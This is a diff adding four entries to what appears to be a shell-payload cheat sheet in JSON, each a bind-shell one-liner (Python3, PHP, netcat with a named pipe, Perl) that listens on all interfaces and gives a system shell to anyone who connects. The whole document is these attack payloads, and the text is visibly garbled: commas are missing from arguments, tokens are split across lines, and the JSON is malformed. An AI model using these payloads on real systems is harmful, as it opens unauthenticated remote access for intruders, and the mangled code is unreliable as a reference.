@@ -1,0 +1,24 @@
+{
+            "name": "Python3 Bind",
+            "command": "python3 -c 'exec(\"\"\"import socket as ssubprocess as sp;s1=s.socket(s.AF_INETs.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKETs.SO_REUSEADDR 1);s1.bind((\"0.0.0.0\"{
+port}));s1.listen(1);ca=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(dshell=Truestdout=sp.PIPEstderr=sp.PIPEstdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\",
+\"\")'",
+            "meta": ["bind" "mac" "linux" "windows"],
+        }
+        {
+            "name": "PHP Bind",
+            "command": "php -r '$s=socket_create(AF_INETSOCK_STREAMSOL_TCP);socket_bind($s\"0.0.0.0\"{port});\socket_listen($s1);$cl=socket_accept($s);while(1){if(!socket_write($cl\",
+$ \"2))exit;\$in=socket_read($cl100);$cmd=popen(\"$in\"\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl$mstrlen($m));}}'",
+            "meta": ["bind" "mac" "linux" "windows"],
+        }
+        {
+            "name": "nc Bind",
+            "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
+            "meta": ["bind" "mac" "linux"],
+        }
+        {
+            "name": "Perl Bind",
+            "command": "perl -e 'use Socket;$p={port};socket(SPF_INETSOCK_STREAMgetprotobyname(\"tcp\"));bind(Ssockaddr_in($p INADDR_ANY));listen(SSOMAXCONN);for(;$p=accept(CS);clos,
+e C){open(STDIN\">&C\");open(STDOUT\">&C\");open(STDERR\">&C\");exec(\"/bin/sh -i\");};'",
+            "meta": ["bind" "mac" "linux"],
+        }
